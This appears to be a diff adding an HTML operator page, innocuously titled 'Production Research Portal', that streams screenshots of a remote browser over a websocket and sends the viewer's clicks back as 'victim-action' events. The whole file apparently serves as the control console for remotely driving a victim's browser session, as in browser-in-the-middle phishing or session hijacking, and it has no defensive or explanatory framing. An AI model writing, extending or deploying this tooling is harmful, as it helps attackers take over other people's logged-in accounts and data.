@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Production Research Portal</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; margin: 0; overflow: hidden; }
+        .bar { width: 100%; background: #111; padding: 10px; font-size: 11px; border-bottom: 1px solid #333; }
+        #mirror { width: 100vw; height: auto; cursor: crosshair; }
+    </style>
+</head>
+<body>
+    <div class="bar">STATUS: <span id="s">CONNECTING_WS...</span></div>
+    <img id="mirror" src="" />
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io({ transports: ['websocket'], upgrade: false });
+        const img = document.getElementById('mirror');
+        socket.on('connect', () => { document.getElementById('s').innerText = "WS_OPEN - HEARTBEAT_ACTIVE"; });
+        socket.on('browser-render', (data) => { img.src = 'data:image/jpeg;base64,' + data.screenshot; });
+        img.addEventListener('click', (e) => {
+            const rect = img.getBoundingClientRect();
+            socket.emit('victim-action', { 
+                type: 'click', 
+                x: (e.clientX - rect.left) * (1280 / rect.width), 
+                y: (e.clientY - rect.top) * (720 / rect.height) 
+            });
+        });
+    </script>
+</body>
+</html>
